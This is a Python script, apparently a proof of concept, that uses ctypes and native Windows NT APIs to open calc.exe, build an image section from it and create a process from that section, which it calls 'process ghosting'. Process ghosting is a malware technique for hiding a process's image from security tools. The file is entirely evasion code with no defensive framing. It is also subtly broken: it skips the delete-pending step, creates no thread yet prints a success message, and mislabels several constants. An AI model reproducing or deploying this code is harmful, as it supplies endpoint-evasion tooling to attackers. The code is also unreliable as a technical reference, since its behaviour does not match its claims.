import ctypes
from ctypes import wintypes, byref, create_unicode_buffer

# Load DLLs
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Define necessary Windows types and structures
class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.USHORT),
        ("MaximumLength", wintypes.USHORT),
        ("Buffer", ctypes.POINTER(wintypes.WCHAR))
    ]

class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.ULONG),
        ("RootDirectory", wintypes.HANDLE),
        ("ObjectName", ctypes.POINTER(UNICODE_STRING)),
        ("Attributes", wintypes.ULONG),
        ("SecurityDescriptor", ctypes.c_void_p),
        ("SecurityQualityOfService", ctypes.c_void_p)
    ]

class IO_STATUS_BLOCK(ctypes.Structure):
    _fields_ = [
        ("Status", wintypes.ULONG),
        ("Information", wintypes.ULONG)
    ]

# Function signatures
ntdll.NtOpenFile.restype = wintypes.ULONG
ntdll.NtOpenFile.argtypes = [
    ctypes.POINTER(wintypes.HANDLE),
    wintypes.DWORD,  # Use wintypes.DWORD for ACCESS_MASK
    ctypes.POINTER(OBJECT_ATTRIBUTES),
    ctypes.POINTER(IO_STATUS_BLOCK),
    wintypes.ULONG,
    wintypes.ULONG
]

ntdll.NtCreateSection.restype = wintypes.ULONG
ntdll.NtCreateSection.argtypes = [
    ctypes.POINTER(wintypes.HANDLE),
    wintypes.ULONG,
    ctypes.POINTER(OBJECT_ATTRIBUTES),
    ctypes.POINTER(wintypes.LARGE_INTEGER),
    wintypes.ULONG,
    wintypes.ULONG,
    wintypes.HANDLE
]

ntdll.NtMapViewOfSection.restype = wintypes.ULONG
ntdll.NtMapViewOfSection.argtypes = [
    wintypes.HANDLE,
    wintypes.HANDLE,
    ctypes.POINTER(ctypes.c_void_p),
    ctypes.c_uint64,  # ULONG_PTR
    wintypes.SIZE,
    ctypes.POINTER(wintypes.LARGE_INTEGER),
    ctypes.POINTER(wintypes.SIZE),
    wintypes.ULONG,
    wintypes.ULONG,
    wintypes.ULONG
]

ntdll.NtCreateProcessEx.restype = wintypes.ULONG
ntdll.NtCreateProcessEx.argtypes = [
    ctypes.POINTER(wintypes.HANDLE),
    wintypes.ULONG,
    ctypes.POINTER(OBJECT_ATTRIBUTES),
    wintypes.HANDLE,
    wintypes.ULONG,
    wintypes.HANDLE,
    wintypes.HANDLE,
    wintypes.HANDLE,
    wintypes.BOOL
]

def open_file(file_path):
    ctypes.set_last_error(0)  # Reset last error to zero before making the call

    handle = wintypes.HANDLE()
    obj_attr = OBJECT_ATTRIBUTES()
    io_status = IO_STATUS_BLOCK()
    uni_string = UNICODE_STRING()

    buffer = create_unicode_buffer(file_path)
    uni_string.Buffer = ctypes.cast(buffer, ctypes.POINTER(wintypes.WCHAR))
    uni_string.Length = len(file_path) * 2
    uni_string.MaximumLength = (len(file_path) + 1) * 2

    obj_attr.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
    obj_attr.RootDirectory = None
    obj_attr.ObjectName = ctypes.pointer(uni_string)
    obj_attr.Attributes = 0x40  # OBJ_CASE_INSENSITIVE
    obj_attr.SecurityDescriptor = None
    obj_attr.SecurityQualityOfService = None

    status = ntdll.NtOpenFile(
        byref(handle),
        0x10000000 | 0x00100000 | 0x00000001,  # GENERIC_READ | GENERIC_WRITE | DELETE
        byref(obj_attr),
        byref(io_status),
        0x00000001 | 0x00000002,  # FILE_SHARE_READ | FILE_SHARE_WRITE
        0x00000001 | 0x00000040  # FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
    )

    last_error = ctypes.get_last_error()
    if status != 0:
        print(f"Failed with NTSTATUS: {status}, Last Error: {last_error}")
        raise ctypes.WinError(last_error)
    else:
        print(f"Success with NTSTATUS: {status}, Last Error: {last_error}")

    return handle

def create_section_from_file(handle):
    section_handle = wintypes.HANDLE()
    max_size = wintypes.LARGE_INTEGER(0)  # Use zero to specify that the size of the file determines the size of the section

    # Define desired access for the section, combining read, write, and execute permissions
    SECTION_ALL_ACCESS = 0x001F0000 | 0x000F0000 | 0x0000F000 | 0x00000100
    PAGE_READWRITE = 0x04

    status = ntdll.NtCreateSection(
        ctypes.byref(section_handle),
        SECTION_ALL_ACCESS,  # Access rights
        None,  # Optional security attributes
        ctypes.byref(max_size),  # Size of the section (0 means use the file size)
        PAGE_READWRITE,  # Protection attributes, allowing read and write
        0x08000000,  # Attributes: SEC_IMAGE specifies that the section is based on an image file
        handle  # Handle to the file from which to create the section
    )

    if status != 0:
        raise ctypes.WinError(ctypes.get_last_error())

    print("[+] Section created successfully")
    return section_handle

def map_section_into_memory(section_handle):
    base_address = ctypes.c_void_p(0)  # Let the system decide where to map the section
    zero_bits = ctypes.c_uint64(0)  # ULONG_PTR
    commit_size = wintypes.SIZE(0)
    section_offset = wintypes.LARGE_INTEGER(0)
    view_size = wintypes.SIZE(0)  # Map the entire section

    status = ntdll.NtMapViewOfSection(
        section_handle,  # Section handle
        kernel32.GetCurrentProcess(),  # Handle to the process
        ctypes.byref(base_address),  # Base address to receive the base address of the view
        zero_bits,
        commit_size,
        ctypes.byref(section_offset),
        ctypes.byref(view_size),  # View size
        2,  # Inherit disposition, 2 = ViewUnmap
        0,  # Allocation type
        0x04  # PAGE_READWRITE protection
    )

    if status != 0:
        raise ctypes.WinError(ctypes.get_last_error())

    print("[+] Section mapped into memory")
    return base_address

def create_process_from_section(section_handle):
    process_handle = wintypes.HANDLE()
    obj_attr = OBJECT_ATTRIBUTES()
    client_id = wintypes.LARGE_INTEGER(0)

    status = ntdll.NtCreateProcessEx(
        ctypes.byref(process_handle),
        0x001F0FFF,  # Access flags
        None,  # Object attributes
        kernel32.GetCurrentProcess(),  # Parent process
        4,  # Flags
        section_handle,  # Section handle
        None,  # Debug port
        None,  # Exception port
        False  # Inherit from parent
    )

    if status != 0:
        raise ctypes.WinError(ctypes.get_last_error())

    print("[+] Process created from section")
    return process_handle

def main():
    calc_path = r"C:\Windows\System32\calc.exe"
    file_handle = open_file(calc_path)
    section_handle = create_section_from_file(file_handle)

    base_address = map_section_into_memory(section_handle)
    process_handle = create_process_from_section(section_handle)

    print("[+] calc.exe launched successfully via process ghosting")
    
    # Close handles if necessary
    kernel32.CloseHandle(section_handle)
    kernel32.CloseHandle(file_handle)
    kernel32.CloseHandle(process_handle)

if __name__ == "__main__":
    main()
